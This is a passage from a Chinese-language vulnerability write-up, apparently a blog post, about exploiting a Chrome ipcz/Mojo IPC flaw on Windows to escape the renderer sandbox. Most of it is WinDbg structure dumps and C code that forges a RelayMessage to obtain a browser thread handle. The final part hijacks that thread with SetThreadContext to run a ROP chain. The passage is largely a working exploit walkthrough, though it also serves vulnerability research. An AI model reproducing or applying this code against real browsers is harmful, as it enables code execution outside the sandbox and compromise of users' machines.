00007ff9<span class="token variable"><span class="token variable">`</span>21affdcd chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+3cd
00007ff9<span class="token variable">`</span></span>21affeb2 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+4b2
00007ff9<span class="token variable"><span class="token variable">`</span>21afff97 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+597
00007ff9<span class="token variable">`</span></span>21b0007c chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+67c
// 省略<span class="token punctuation">..</span>.
</code></pre>
<p>最后还需要构造DriverObject对象，他将携带我们前面构造好的WrappedPlatformHandle对象，WrappedPlatformHandle对象再通过一开始构造好的PlatformHandle对象来将伪句柄传给browser。DriverObject对象结构：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> dt chrome<span class="token operator">!</span>ipcz::DriverObject
   +0x000 driver_          <span class="token keyword">:</span> Ptr64 IpczDriver
   +0x008 handle_          <span class="token keyword">:</span> Uint8B
</code></pre>
<p>这个对象也并不复杂，handle_就是WrappedPlatformHandle对象地址，而driver_则可以直接从前面获取到的全局node对象中获取到：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> dt chrome<span class="token operator">!</span>ipcz::Node
   +0x008 ref_count_       <span class="token keyword">:</span> std::__Cr::atomic<span class="token operator">&lt;</span>int<span class="token operator">&gt;</span>
   +0x000 __VFN_table <span class="token keyword">:</span> Ptr64 
   +0x00c type_            <span class="token keyword">:</span> ipcz::APIObject::ObjectType
   +0x010 type_            <span class="token keyword">:</span> ipcz::NodeType
   +0x018 driver_          <span class="token keyword">:</span> Ptr64 IpczDriver    //driver_在这里
   +0x020 options_         <span class="token keyword">:</span> IpczCreateNodeOptions
   +0x050 features_        <span class="token keyword">:</span> ipcz::Features
   +0x058 mutex_           <span class="token keyword">:</span> absl::Mutex
   +0x060 assigned_name_   <span class="token keyword">:</span> ipcz::NodeName
   +0x070 broker_link_     <span class="token keyword">:</span> ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span>
   +0x078 allocation_delegate_link_ <span class="token keyword">:</span> ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span>
   +0x080 connections_     <span class="token keyword">:</span> absl::flat_hash_map<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::Node::Connection,absl::hash_internal::Hash<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::equal_to<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::allocator<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>const ipcz::NodeName,ipcz::Node::Connection<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0a0 pending_introductions_ <span class="token keyword">:</span> absl::flat_hash_map<span class="token operator">&lt;</span>ipcz::NodeName,std::__Cr::unique_ptr<span class="token operator">&lt;</span>ipcz::Node::PendingIntroduction,std::__Cr::default_delete<span class="token operator">&lt;</span>ipcz::Node::PendingIntroduction<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>,absl::hash_internal::Hash<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::equal_to<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::allocator<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>const ipcz::NodeName,std::__Cr::unique_ptr<span class="token operator">&lt;</span>ipcz::Node::PendingIntroduction,std::__Cr::default_delete<span class="token operator">&lt;</span>ipcz::Node::PendingIntroduction<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0c0 in_progress_introductions_ <span class="token keyword">:</span> absl::flat_hash_set<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::NodeName<span class="token operator">&gt;</span>,absl::hash_internal::Hash<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::NodeName<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>,std::__Cr::equal_to<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::NodeName<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>,std::__Cr::allocator<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::NodeName<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0e0 broker_link_callbacks_ <span class="token keyword">:</span> std::__Cr::vector<span class="token operator">&lt;</span>std::__Cr::function<span class="token operator">&lt;</span>void <span class="token punctuation">(</span>ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>,std::__Cr::allocator<span class="token operator">&lt;</span>std::__Cr::function<span class="token operator">&lt;</span>void <span class="token punctuation">(</span>ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0f8 other_brokers_   <span class="token keyword">:</span> absl::flat_hash_map<span class="token operator">&lt;</span>ipcz::NodeName,ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span>,absl::hash_internal::Hash<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::equal_to<span class="token operator">&lt;</span>ipcz::NodeName<span class="token operator">&gt;</span>,std::__Cr::allocator<span class="token operator">&lt;</span>std::__Cr::pair<span class="token operator">&lt;</span>const ipcz::NodeName,ipcz::Ref<span class="token operator">&lt;</span>ipcz::NodeLink<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
</code></pre>
<p>之后还需要将构造好的driver_object添加到message对象的driver_objects_列表中，这部分的实现也可以直接调用chromium实现好的函数：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-15/1cH5bXuTsV2UT4Rc.png" alt="输入图片说明"><br>
最后，只要将上面构造好的message发送出去，在issue tracker的伪代码中使用了<code>NodeLink::RelayMessage</code>函数，但该函数实际是一个内联函数：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> x chrome<span class="token operator">!</span>ipcz::NodeLink::RelayMessage
00007ff9`21af498c chrome<span class="token operator">!</span>ipcz::NodeLink::RelayMessage <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::NodeLink::Transmit+16c
</code></pre>
<p>但是好在内联函数通常代码都比较简单，我们可以自实现一个。RelayMessage函数发送message主要依赖于<code> NodeLink::Transmit</code>函数：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-15/wUhnTnCicWHcHcwL.png" alt="输入图片说明"><br>
<code> NodeLink::Transmit</code>会与<code>NodeLink::RelayMessage</code>相互引用，当当前message准备好发送时将直接调用<code> DriverTransport::Transmit</code>传递message，如果为准备好，就会再次调用<code>NodeLink::RelayMessage</code>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-15/15ZIhvh4mkscZ9d0.png" alt="输入图片说明"><br>
理论上我们可以直接调用Transmit，但问题是阅读代码后就会发现Transmit实际发送的是一个<code>ipcz::msg::RelayMessage</code>消息：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/5aWDexAfRJfzT8SN.png" alt="输入图片说明"><br>
他是Message的子类，在RelayMessage函数中会通过传入的Message来初始化新创建的<code>ipcz::msg::RelayMessage</code>消息，所以我们还需要编写一个函数来创建及初始化<code>ipcz::msg::RelayMessage</code>消息，这个message对象十分重要，这里初始化的主要是RelayMessage_Params成员对象，它在内存中实际位于RelayMessage的inlined_data中，它主要用来保存RelayMessage对象中的一些信息，比如其中destination成员对象为消息最终要送达的进程，也就是说如果我们直接传送Message对象的话browser进程是找不到消息送达进程的，而在这个漏洞环境中，我们需要将destination设置为渲染进程自身，这样我们才能受到browser反馈回来的handle。<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/ljwS3Erw5eGLdJFG.png" alt="输入图片说明"><br>
下一条代码用于根据Message对象data的size来创建RelayMessage的data，AllocateArray函数内部调用了AllocateGenericArray函数，此函数内部逻辑比较复杂，自实现不太现实，但是此函数未被内联，我们可以直接获取其地址call过去，传参逻辑也比较简单将sizeof(uint8_t)作为第一个参数，Message.data_.size作为第二各参数传入即可：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/Ie00afug7O0ITd8X.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/w9tBh0gHY9rA4tq2.png" alt="输入图片说明">之后需要将Message中的data完全拷贝到RelayMessage的data中：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/xgTDxie8GzZNtg1Z.png" alt="输入图片说明"><br>
这里的逻辑很好理解，但是我在这里出现过一处问题，可以看到GetArrayData函数最后会将得到的地址+1，因为我没有仔细的去读这部分代码，将+1误认为是+1字节，但仔细看上一条代码后就会发现，这里+1其实是+(1*sizeof(internal::ArrayHeader))，如果在这里地址计算错误的话，就会导致拷贝的数据内容将前面已经构造好的数据内容覆盖，从而导致构造出错误的RelayMessage：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/r8vG2xWMKLFKZrIR.png" alt="输入图片说明"><br>
最后就是将Message的driver_objects拷贝到RelayMessage的driver_objects中，并设置RelayMessage_Params的v0::driver_objects：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/5yEIspAGGxqD6GbX.png" alt="输入图片说明"><br>
<code>Message::AppendDriverObjects</code>的代码逻辑也很简单，它主要就是构造了一个<code>internal::DriverObjectArrayData</code>实例并返回，而driver_object_这部分我们直接用memcpy拷贝即可，效果是一样的：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/wZAaMNw4SgjAzwie.png" alt="输入图片说明"><br>
最终我们可以得到这样一个函数：</p>
<pre class=" language-c"><code class="prism ++ language-c">Message<span class="token operator">*</span> <span class="token function">build_relay_message</span><span class="token punctuation">(</span><span class="token keyword">const</span> NodeName<span class="token operator">*</span> n<span class="token punctuation">,</span> Message<span class="token operator">*</span> msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	Message<span class="token operator">*</span> rm <span class="token operator">=</span>
		reinterpret_cast<span class="token operator">&lt;</span>Message<span class="token operator">*</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>
			heap<span class="token punctuation">.</span><span class="token function">alloc_block</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>rm<span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">message_func</span><span class="token punctuation">(</span>rm<span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RelayMessage_Params<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	RelayMessage_Params<span class="token operator">*</span> params <span class="token operator">=</span>
		<span class="token punctuation">(</span>RelayMessage_Params<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>rm <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>header<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RelayMessage_Params<span class="token punctuation">)</span><span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>header<span class="token punctuation">.</span>padding <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	
	<span class="token comment">// set to node name</span>
	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>destination<span class="token punctuation">.</span>hig <span class="token operator">=</span> n<span class="token operator">-&gt;</span>hig<span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>destination<span class="token punctuation">.</span>low <span class="token operator">=</span> n<span class="token operator">-&gt;</span>low<span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>padding <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	uintptr_t msg_data_size <span class="token operator">=</span> 
		<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>msg<span class="token operator">-&gt;</span>data_ <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>data <span class="token operator">=</span>
		<span class="token function">AllocateGenericArray</span><span class="token punctuation">(</span>
			rm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint8_t<span class="token punctuation">)</span><span class="token punctuation">,</span> msg_data_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	size_t offset <span class="token operator">=</span> params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
	uintptr_t data_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>uintptr_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>rm<span class="token operator">-&gt;</span>data_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	uintptr_t dst <span class="token operator">=</span> data_ptr <span class="token operator">+</span> offset <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ArrayHeader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	uintptr_t msg_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>uintptr_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>msg<span class="token operator">-&gt;</span>data_ <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	uintptr_t src <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uintptr_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>msg<span class="token operator">-&gt;</span>data_<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// copy Message data to RelayMessage data</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>dst<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>src<span class="token punctuation">,</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// AppendDriverObjects</span>
	uintptr_t driver_obj_src <span class="token operator">=</span> 
		<span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span><span class="token punctuation">(</span>msg<span class="token operator">-&gt;</span>driver_objects_<span class="token punctuation">)</span><span class="token punctuation">;</span>
	uintptr_t driver_obj_dst <span class="token operator">=</span> 
		<span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span><span class="token punctuation">(</span>rm<span class="token operator">-&gt;</span>driver_objects_<span class="token punctuation">)</span><span class="token punctuation">;</span>
	DriverObjectArrayData array_data <span class="token operator">=</span> <span class="token punctuation">{</span>
		<span class="token punctuation">.</span>first_object_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>num_objects <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token punctuation">}</span><span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>driver_objects<span class="token punctuation">.</span>first_object_index <span class="token operator">=</span> 
		array_data<span class="token punctuation">.</span>first_object_index<span class="token punctuation">;</span>
	params<span class="token operator">-&gt;</span>V0<span class="token punctuation">.</span>driver_objects<span class="token punctuation">.</span>num_objects <span class="token operator">=</span>
		array_data<span class="token punctuation">.</span>num_objects<span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>driver_obj_dst<span class="token punctuation">,</span>
		<span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>driver_obj_src<span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> rm<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最终可以得到这样一个消息对象：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:022<span class="token operator">&gt;</span> dt 0x215ad004148 chrome<span class="token operator">!</span>ipcz::msg::RelayMessage
   +0x000 inlined_data_    <span class="token keyword">:</span> std::__Cr::optional<span class="token operator">&lt;</span>absl::InlinedVector<span class="token operator">&lt;</span>unsigned char,128,std::__Cr::allocator<span class="token operator">&lt;</span>unsigned char<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x090 received_data_   <span class="token keyword">:</span> std::__Cr::optional<span class="token operator">&lt;</span>ipcz::Message::ReceivedDataBuffer<span class="token operator">&gt;</span>
   +0x0a8 data_            <span class="token keyword">:</span> absl::Span<span class="token operator">&lt;</span>unsigned char<span class="token operator">&gt;</span>
   +0x0b8 driver_objects_  <span class="token keyword">:</span> absl::InlinedVector<span class="token operator">&lt;</span>ipcz::DriverObject,2,std::__Cr::allocator<span class="token operator">&lt;</span>ipcz::DriverObject<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0e0 transmissible_driver_handles_ <span class="token keyword">:</span> absl::InlinedVector<span class="token operator">&lt;</span>unsigned long long,2,std::__Cr::allocator<span class="token operator">&lt;</span>unsigned long long<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0f8 envelope_        <span class="token keyword">:</span> ipcz::DriverObject
   <span class="token operator">=</span>00007ff9<span class="token variable"><span class="token variable">`</span>307f8e40 kVersions        <span class="token keyword">:</span> <span class="token punctuation">[</span>1<span class="token punctuation">]</span> ipcz::internal::VersionMetadata
0:022<span class="token operator">&gt;</span> dq 0x215ad004148
00000215<span class="token variable">`</span></span>ad004148  00000000<span class="token variable"><span class="token variable">`</span>000000e0 00000000<span class="token variable">`</span></span>00420018
00000215<span class="token variable"><span class="token variable">`</span>ad004158  00000000<span class="token variable">`</span></span>00000000 00000000<span class="token variable"><span class="token variable">`</span>00000000
00000215<span class="token variable">`</span></span>ad004168  00000000<span class="token variable"><span class="token variable">`</span>00000028 993e4de6<span class="token variable">`</span></span>bf8be04d  // node name <span class="token keyword">in</span> here<span class="token punctuation">(</span>00000215<span class="token variable"><span class="token variable">`</span>ad004168+0x8、0x00000215<span class="token variable">`</span></span>ad004178<span class="token punctuation">)</span>
00000215<span class="token variable"><span class="token variable">`</span>ad004178  ec424ad9<span class="token variable">`</span></span>a0575110 00000000<span class="token variable"><span class="token variable">`</span>00000040
00000215<span class="token variable">`</span></span>ad004188  00000001<span class="token variable"><span class="token variable">`</span>00000000 00000028<span class="token variable">`</span></span>00000030
00000215<span class="token variable"><span class="token variable">`</span>ad004198  00000000<span class="token variable">`</span></span>00690018 00000000<span class="token variable"><span class="token variable">`</span>00000000
00000215<span class="token variable">`</span></span>ad0041a8  00000000<span class="token variable"><span class="token variable">`</span>00000000 deadbeef<span class="token variable">`</span></span>12345678
00000215<span class="token variable"><span class="token variable">`</span>ad0041b8  00000000<span class="token variable">`</span></span>00000000 aaaaaaaa`aaaaaaaa
</code></pre>
<p>最后拿到构造好的RelayMessage后就可以直接调用Transmit函数将消息传递给browser。消息发送成功后渲染进程的<code>NodeLink::OnAcceptRelayedMessage</code>函数就会被调用：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-17/im3khNiZ0MD2Y1Nu.png" alt="输入图片说明"><br>
解析收到的accept对象，我们可以从它0xA8偏移处得到一个地址指针：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-19/Nctb9lpIciSztJGi.png" alt="输入图片说明"><br>
从这里可以找到我们传入的0x69 message_id，我们可以据此来判断当前是否是我们需要的message。<br>
然后从accept+0xC8出可以得到WrappedPlatformHandle对象指针，从此对象中可以得到Browser返回给渲染进程的handle:</p>
<pre class=" language-bash"><code class="prism  language-bash">0:010<span class="token operator">&gt;</span> r rdx
rdx<span class="token operator">=</span>00000039c73fee10
0:010<span class="token operator">&gt;</span> dq 00000039c73fee10+0xc8 l1
00000039<span class="token variable"><span class="token variable">`</span>c73feed8  00001924<span class="token variable">`</span></span>0048ab90
0:010<span class="token operator">&gt;</span> dt 00001924<span class="token variable"><span class="token variable">`</span>0048ab90 chrome<span class="token operator">!</span>mojo::core::ipcz_driver::WrappedPlatformHandle
   +0x008 ref_count_       <span class="token keyword">:</span> base::AtomicRefCount
   +0x000 __VFN_table <span class="token keyword">:</span> 0x00007ff8<span class="token variable">`</span></span>15828560 
   +0x00c type_            <span class="token keyword">:</span> 4 <span class="token punctuation">(</span> kWrappedPlatformHandle <span class="token punctuation">)</span>
   +0x010 handle_          <span class="token keyword">:</span> mojo::PlatformHandle
0:010<span class="token operator">&gt;</span> dx -r1 <span class="token punctuation">(</span>*<span class="token variable"><span class="token punctuation">((</span>chrome<span class="token operator">!</span>mojo<span class="token operator">:</span><span class="token operator">:</span>PlatformHandle <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x19240048aba0</span><span class="token punctuation">))</span></span>
<span class="token punctuation">(</span>*<span class="token variable"><span class="token punctuation">((</span>chrome<span class="token operator">!</span>mojo<span class="token operator">:</span><span class="token operator">:</span>PlatformHandle <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x19240048aba0</span><span class="token punctuation">))</span></span>                 <span class="token punctuation">[</span>Type: mojo::PlatformHandle<span class="token punctuation">]</span>
    <span class="token punctuation">[</span>+0x000<span class="token punctuation">]</span> type_            <span class="token keyword">:</span> kHandle <span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">[</span>Type: mojo::PlatformHandle::Type<span class="token punctuation">]</span>
    <span class="token punctuation">[</span>+0x008<span class="token punctuation">]</span> handle_          <span class="token punctuation">[</span>Type: base::win::GenericScopedHandle<span class="token operator">&lt;</span>base::win::HandleTraits,base::win::DummyVerifierTraits<span class="token operator">&gt;</span><span class="token punctuation">]</span>
0:010<span class="token operator">&gt;</span> dx -r1 <span class="token punctuation">(</span>*<span class="token variable"><span class="token punctuation">((</span>chrome<span class="token operator">!</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>GenericScopedHandle<span class="token operator">&lt;</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>HandleTraits<span class="token punctuation">,</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>DummyVerifierTraits<span class="token operator">&gt;</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x19240048aba8</span><span class="token punctuation">))</span></span>
<span class="token punctuation">(</span>*<span class="token variable"><span class="token punctuation">((</span>chrome<span class="token operator">!</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>GenericScopedHandle<span class="token operator">&lt;</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>HandleTraits<span class="token punctuation">,</span>base<span class="token operator">:</span><span class="token operator">:</span>win<span class="token operator">:</span><span class="token operator">:</span>DummyVerifierTraits<span class="token operator">&gt;</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x19240048aba8</span><span class="token punctuation">))</span></span>                 <span class="token punctuation">[</span>Type: base::win::GenericScopedHandle<span class="token operator">&lt;</span>base::win::HandleTraits,base::win::DummyVerifierTraits<span class="token operator">&gt;</span><span class="token punctuation">]</span>
    <span class="token punctuation">[</span>+0x000<span class="token punctuation">]</span> handle_          <span class="token keyword">:</span> 0x740 <span class="token punctuation">[</span>Type: void *<span class="token punctuation">]</span>  // handle <span class="token keyword">in</span> here
</code></pre>
<p>所以想要得到Browser返回的handle，只需要hook OnAcceptRelayedMessage函数即可。<br>
最后我们可以用工具查看渲染进程的句柄信息：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-22/H2chFBdNCFNAPpnW.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-22/bHBBu6lujU8dhmCe.png" alt="输入图片说明"><br>
可以看到渲染进程996具有browser进程1596 IOThread线程的完整控制权限。</p>
<p>后续的利用步骤就如ISSUE TRACKER的描述，先构造ROP链，再通过CONTEXT结构体以及SetThreadContext、GetThreadContext函数来控制设置browser线程上下文执行rop链：</p>
<pre class=" language-c"><code class="prism  language-c"> CONTEXT Context<span class="token punctuation">;</span>
 <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Context<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Context<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 Context<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Context<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
      Context<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_ALL<span class="token punctuation">;</span>
      stack_pos <span class="token operator">=</span> Context<span class="token punctuation">.</span>Rsp <span class="token operator">-</span> <span class="token number">256</span><span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>Rdi <span class="token operator">=</span> Context<span class="token punctuation">.</span>Rsp <span class="token operator">-</span> <span class="token number">296</span><span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>R14 <span class="token operator">=</span> code_gadget_end_address_EBFE<span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>Rip <span class="token operator">=</span> code_gadget_start_address1<span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>Rbx <span class="token operator">=</span> code_gadget_end_address_EBFE<span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>Rsp <span class="token operator">-</span><span class="token operator">=</span> 256i64<span class="token punctuation">;</span>
      Context<span class="token punctuation">.</span>Rbp <span class="token operator">=</span> Context<span class="token punctuation">.</span>Rsp<span class="token punctuation">;</span>
      <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Context<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v4 <span class="token operator">=</span> code_gadget_end_address_EBFE<span class="token punctuation">;</span>
      <span class="token keyword">do</span>
      <span class="token punctuation">{</span>
        <span class="token function">ResumeThread</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SuspendThread</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Context<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> Context<span class="token punctuation">.</span>Rip <span class="token operator">!=</span> v4 <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最终执行效果：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-27/W5GscmMpjwe9T0g5.gif" alt="输入图片说明"><br>
